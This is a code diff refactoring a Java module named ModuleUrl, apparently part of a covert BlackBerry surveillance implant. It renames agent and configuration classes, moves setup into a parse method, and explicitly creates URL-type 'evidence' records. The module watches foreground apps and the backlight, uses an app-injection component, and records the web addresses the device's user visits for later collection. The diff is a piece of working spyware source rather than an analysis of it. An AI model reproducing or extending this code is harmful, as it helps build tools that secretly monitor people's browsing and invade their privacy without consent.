@@ -13,13 +13,14 @@ import java.util.Date;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
-import blackberry.AgentManager;
+import blackberry.ModuleManager;
 import blackberry.AppListener;
 import blackberry.Device;
-import blackberry.config.Conf;
+import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
@@ -44,38 +45,14 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
 
-    /**
-     * Instantiates a new url agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public ModuleUrl(final boolean agentEnabled) {
-        super(BaseModule.AGENT_URL, agentEnabled, Conf.AGENT_URL_ON_SD, "UrlAgent");
-
-        //#ifdef URL_FORCED
-        enable(true);
-        //#endif
-
+    
+    protected boolean parse(ConfModule conf) {
         if (Device.getInstance().atLeast(6, 0)) {
             seen = false;
         }
-    }
-
-    /**
-     * Instantiates a new url agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModuleUrl(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
-
         setPeriod(APP_TIMER_PERIOD);
         setDelay(APP_TIMER_PERIOD);
+        return true;
     }
 
     public synchronized void actualStart() {
@@ -139,17 +116,7 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         }
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParameters) {
-        //#ifdef DEBUG
-        debug.trace("parse");
-        //#endif
 
-        return true;
-    }
 
     boolean isAppForeground;
 
@@ -199,6 +166,7 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         items.addElement(WChar.getBytes(url, true));
         items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
 
+        Evidence evidence = new Evidence(EvidenceType.URL);
         evidence.createEvidence(null);
         evidence.writeEvidences(items);
         evidence.close();
@@ -206,7 +174,7 @@ public final class ModuleUrl extends BaseModule implements ApplicationObserver,
     }
 
     public static ModuleUrl getInstance() {
-        return (ModuleUrl) AgentManager.getInstance().getItem(BaseModule.AGENT_URL);
+        return (ModuleUrl) ModuleManager.getInstance().get("url");
     }
 
     //#ifdef DEBUG
